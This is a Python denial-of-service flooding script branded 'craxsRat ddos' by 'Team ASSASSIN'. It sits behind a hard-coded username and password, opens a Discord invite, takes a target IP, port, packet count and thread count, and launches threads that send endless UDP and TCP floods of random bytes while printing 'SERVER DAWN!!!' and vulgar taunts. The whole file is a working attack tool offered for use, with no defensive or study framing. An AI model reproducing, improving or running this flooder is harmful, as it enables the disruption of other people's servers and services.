import random
import socket
import threading
import os
import sys
import time

###### MESSAGE MIKA ON TOP! #####
os.system("clear")
os.system("xdg-open https://discord.gg/8gmRVnRRwV")
print("\u001b[33m Welcome to craxsRat ddos")
time.sleep(2)
print("Loading.......")
os.system("clear")

#### Login       

attemps = 0

while attemps < 100:
    username = input('Enter your username: ')
    password = input('Enter your password: ')

    if username == 'MANITA' and password =='KARASKO':
        print('You have successfully logged in Welcome to MANITA!!')
        break
    else:
        print('Incorrect credentials. Check if you have Caps lock on and try again.')
        attemps += 1
        continue
os.system("clear")

print("""
\u001b[31m
	  AUTHOR TOOLS : Team ASSASSIN


""")

ip = str(input(" Target IP :"))
port = int(input(" Target Port :"))
choice = str(input(" (y/n) :"))
times = int(input(" PACKT :"))
threads = int(input(" Threads :"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"SERVER DAWN!!!")
		except:
			print("[!] تم النيك!!!")

def run2():
	data = random._urandom(999)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"SERVER DAWN!!!")
		except:
			s.close()
			print("[*] يتم النيك!!!")
            

def run3():
	data = random._urandom(818)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"SERVER DAWN!!!")
		except:
			s.close()
			print("[*] يتم النيك!!!")
            
  
def run4():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"SERVER DAWN!!!")
		except:
			s.close()
			print("[*] يتم النيك!!!")
											
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
else:
		th = threading.Thread(target = run4)
		th.start()
